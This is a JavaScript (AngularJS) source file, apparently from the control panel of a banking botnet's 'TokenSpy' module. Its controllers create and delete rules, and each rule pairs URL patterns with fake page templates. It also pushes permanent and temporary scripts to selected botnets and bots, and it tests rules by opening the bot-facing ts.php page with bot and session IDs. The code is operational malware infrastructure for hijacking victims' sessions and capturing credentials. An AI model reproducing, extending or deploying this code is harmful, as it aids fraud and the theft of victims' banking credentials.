'use strict';

require(['page-botnet_tokenspy-index'], function(App){
    var app = App.init(window.data.tokenspy.index);
    App.load(document.getElementById('ts-index'));
});

define('page-botnet_tokenspy-index', ['angular', 'underscore', 'jquery', 'bootstrap', 'colorbox', 'jquery.contextMenu', 'angular-extensions'], function(angular, _, $){
    var init = function(appData){
        var app = angular.module('TokenSpy.index', ['Extensions']);

        // Controllers
        app.controller('TsRulesCtrl', ['$scope', '$element', function($scope, $element){
            $scope.rules = appData.TsRulesCtrl.rules;
            $scope.availableTemplates = appData.TsRulesCtrl.availableTemplates;
            $scope.edit_rule = undefined;

            /** Start editing rule #<id>
             * @param id
             */
            $scope.editRule = {
                rule: undefined,
                _emptyRule: {
                    id: undefined,
                    name: undefined,
                    patterns: [],
                    pmasks: [],
                    enabled: true,
                    template: undefined,
                    skeleton: undefined,
                    page: undefined
                },
                $modal: $('#ts-index-rule-edit'),

                init: function(id){
                    if (id)
                        this.rule = $scope.rules[id];
                    else
                        this.rule = angular.copy(this._emptyRule);

                    if (!this.rule.page) this.rule.page = undefined; // we don't like `null`
                    if (!this.rule.skeleton) this.rule.skeleton = undefined;
                    this.$modal.modal('show');
                },
                addPattern: function(){
                    if (!this.rule.patterns)
                        this.rule.patterns = [];
                    this.rule.patterns.push({
                        uid: this.rule.patterns.length,
                        mask: undefined,
                        post:[]
                    });
                },
                removePattern: function(i){
                    this.rule.patterns.splice(i,1);
                },
                editPage: function(){
                    $.colorbox({
                        href: '?m=botnet_tokenspy/ajaxEditPage&class=Rule&prop=page&id=' + this.rule.id + '&controlled=1',
                        open: true,
                        iframe: true, fastIframe: false,
                        width: '90%',
                        height: '90%',
                        onComplete: function(){
                            // `fastIframe:false` ensures the iframe tag is present
                            var $iframe = $("#cboxLoadedContent iframe");

                            // Get the window object
                            var w = $iframe.get(0).contentWindow;

                            // iframe-app initializer
                            var initApp = function(){
                                // Another window's jQuery is a whole new world and it can't control custom events between windows.
                                // Thus, use the window's own jQuery to trigger an event
                                var $w = w.$(w); // window's own jQuery

                                // Init the app
                                $w.trigger('app-init', [$scope.editRule.rule.page, $scope.editRule.rule.skeleton]);

                                // Save hook
                                $w.on('ts-page-save', function(e, page){
                                    $scope.editRule.rule.page = page;
                                    $scope.$apply();
                                    $.colorbox.close();
                                });
                            };

                            /* Colorbox reuses the <iframe> tag, thus:
                             * - It's there, loaded & ready when you first click the editor
                             * - It's there but not loaded - with each following click
                             * As we only need jQuery, let's determine its state with the help of jQuery
                             */
                            if (w.$) // jQuery is available: that means, the app has managed to load
                                initApp();
                            else // subscribe to the 'app-standby' event so the app inits itself once it's ready
                                $(w).on('app-standby', initApp); // yes, we can use our jQuery to subscribe
                        }
                    });
                },
                editTemplate: function(){
                    $.colorbox({
                            href: '?m=botnet_tokenspy/ajaxEditTemplate',
                            open: true,
//                            iframe: true, fastIframe: false,
                            top: 0, width: '90%', height: '90%',
                            onComplete: function(){
                                $.colorbox.resize({height: '90%'}); 
                                require(['page-botnet_tokenspy-edittpl'], function(App){
                                    App.init(
                                        $scope.editRule.rule.skeleton,
                                        function(skeleton){
                                            $scope.editRule.rule.skeleton = skeleton;
                                            $scope.$apply();
                                            $.colorbox.close();
                                        }
                                    );
                                });
                            }
                    });
                },
                save: function(){
                    $scope.ajaxRule(undefined, this.rule, false, function(){
                        $('#ts-index-rule-edit').modal('hide');
                    });

                    // Notify that an update is needed
                    var $scriptScope = $('#ts-index-rules-submit').scope();
                    $scriptScope.needsUpdate = true;
                }
            };

            /** Rule CRUD
             */
            $scope.ajaxRule = function(id, rule, del, callback){
                if (del && !window.confirm('Delete Rule "'+ $scope.rules[id].name +'"?'))
                    return;

                var post = {
                    id: id? id : undefined,
                    data: rule? rule : undefined,
                    del: del? 1 : undefined
                };
                $.post('?m=botnet_tokenspy/crudRule.json', post, function(rule){
                    if (del)
                        delete $scope.rules[id];
                    else
                        $scope.rules[rule.id] = rule;
                    if (callback)
                        callback.apply(rule);

                    $scope.$apply();
                });
            };

            // Context menu
            $scope.cMenu = {
                rule: {
                    selector: 'tr *',
                    callback: function(key,opt){
                        var id = $(this).closest('tr').data('id');

                        switch (key){
                            case 'del':
                                $scope.ajaxRule(id, undefined, true, function(){ $scope.$apply(); });
                                break;
                        }
                    },
                    items: {
                        del: { icon: 'delete', name: 'Delete'}
                    }
                }
            };
        }]);

        app.controller('TsRulesScriptCtrl', ['$scope', '$element', function($scope, $element){
            $scope.script = appData.TsRulesScriptCtrl.script;
            $scope.script_loads = appData.TsRulesScriptCtrl.script_loads;
            $scope.botnets = appData.TsRulesScriptCtrl.botnets;
            $scope.needsUpdate = appData.TsRulesScriptCtrl.needsUpdate;

            $scope.tscript = {
                id: undefined,
                bots_wl: []
            };

            // Watches
            $scope.$watch('botnets', function(newValue, oldValue){
                $scope.script.botnets_wl = _(newValue).chain()
                    .pairs()
                    .filter(function(v){ return v[1]; })
//                    .map(function(i,v){ return v[0]; })
                    .object().keys()
                    .value();
            }, true);

            // UI behaviors
            var CheckboxAll = function(obj, newvalue){
                return _(obj).chain()
                    .pairs()
                    .map(function(i,v){ v[1] = newvalue; return v; })
                    .object()
                    .value();
            };
            /** Select botnets: All
             */
            $scope.botnetsAll = function(){
                $scope.botnets = CheckboxAll($scope.botnets, true);
            };
            /** Select botnets: None
             */
            $scope.botnetsNone = function(){
                $scope.botnets = CheckboxAll($scope.botnets, false);
            };

            /** Submit a permanent script
             * @param {Object} script
             * @param {Boolean} del
             */
            $scope.crudBotscript = function(script, del){
                var post = {
                    data: script? script : undefined,
                    del: del? 1 : undefined,
                    temp: 0
                };
                $scope.crudBotscript.ok = undefined;
                $scope.crudBotscript.error = undefined;

                $.post('?m=botnet_tokenspy/crudBotscript.json', post, function(script){
                    if (script.id){
                        $scope.crudBotscript.ok = true;
                        $scope.script = script;
                        $scope.needsUpdate = false;
                    } else
                        $scope.crudBotscript.error = script;

                    $scope.$apply();
                });
            };

            /** Submit a temporary script
             * @param {Object} tscript
             * @param {Boolean} del
             */
            $scope.crudBotscriptTemp = function(tscript, del){
                $('#tempscript-modal').modal('hide');

                var post = {
                    data: tscript? tscript : undefined,
                    del: del? 1 : undefined,
                    temp: true
                };
                $scope.crudBotscriptTemp.ok = undefined;
                $scope.crudBotscriptTemp.error = undefined;

                $.post('?m=botnet_tokenspy/crudBotscript.json', post, function(script){
                    if (script.id){
                        $scope.crudBotscriptTemp.ok = true;
                        $scope.tscript = script;
                    } else
                        $scope.crudBotscript.error = script;

                    $scope.$apply();
                });
            };
        }]);

        app.controller('TsServiceCtrl', ['$scope', '$element', function($scope, $element){
            $scope.rules = appData.TsServiceCtrl.rules;

            /** Test the named rule
             * @param {{id:Number, name:String}} rule
             */
            $scope.testRule = function(rule){
                var
                    data = {
                        domain: 'example.com',
                        rule: rule.name,
                        pattern: 0,
                        session: '',
                        botId: 'TestBot'
                    },
                    // Build a query string
                    query = function(data){
                        return _.map(data, function(v,k){
                            return [k, encodeURI(v)].join('=');
                        }).join('&');
                    },
                    // Enter action
                    enter = function(data, callback){
                        var url = 'ts.php/.ts/enter?' + query({
                            url: 'http://' + data.domain + '/',
                            buid: data.botId,
                            ruid: data.rule,
                            puid: data.pattern
                        });
                        $.get(url, function(res){
                            if (!res.ok)
                                callback(res.error);
                            else {
                                data.session = res.session;
                                callback();
                            }
                        });
                    },
                    // Open window
                    openWindow = function(data){
                        var w = window.open('ts.php/?' + query({
                            DOMAIN: data.domain,
                            RULE_NAME: data.rule,
                            PATTERNID: data.pattern,
                            SESSIONID: data.session,
                            BOTID: data.botId
                        }));
                        w.title = 'TokenSpy Test';
                    }
                ;

                enter(data, function(e){
                    if (e)
                        window.alert('Test failed: ' + e);
                    else
                        openWindow(data);
                });
            };

            /** Reset TokenSpy state
             */
            $scope.tsResetState = function(){
                $.post('?m=botnet_tokenspy/tsResetState.json', function(){
                    $('html').css('background', '#000');
                    $(document.body).fadeOut(1500, function(){
                        window.location.reload();
                    });
                });
            };
        }]);

        // Finish
        return app;
    };

    return {
        init: init,
        load: function(ngApp){ angular.bootstrap(ngApp, ['TokenSpy.index']); }
    };
});
